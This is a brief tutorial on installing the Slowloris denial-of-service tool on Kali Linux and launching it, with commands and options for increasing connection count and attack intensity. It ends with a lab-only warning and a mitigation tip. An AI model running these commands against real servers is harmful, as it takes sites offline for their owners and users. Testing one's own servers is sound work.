1️⃣ Install Slowloris

Kali sometimes has it pre-installed, but if not, run:

sudo apt update
sudo apt install slowloris


If you want the latest Python version from GitHub:

sudo apt install git python3
git clone https://github.com/gkbrk/slowloris.git
cd slowloris

2️⃣ Check if it’s Installed
slowloris -h


If you cloned from GitHub:

python3 slowloris.py -h

3️⃣ Basic Usage
slowloris target.com


This sends a slow HTTP request attack to target.com with default settings.

4️⃣ Common Options

You can adjust the attack intensity and duration:

slowloris target.com -p 80 -s 200 -t 5 --https


Options explained:

-p → Port (usually 80 for HTTP, 443 for HTTPS)

-s → Number of simultaneous connections (default is 150)

-t → Time between header sends (seconds)

--https → Enable HTTPS mode

-v → Verbose output (shows what’s happening)

Example with Python version:

python3 slowloris.py target.com -p 80 -s 200 -v

5️⃣ Stop the Attack

Press:

CTRL + C


This will end the attack and close all connections.

6️⃣ Legal & Safety Notes

Run only on your own servers or in a lab environment.

Slowloris is low-bandwidth but can still take down vulnerable sites.

Use it for pentesting to check if your server needs protection (mitigate by using reverse proxies like Nginx or Apache with timeout rules).
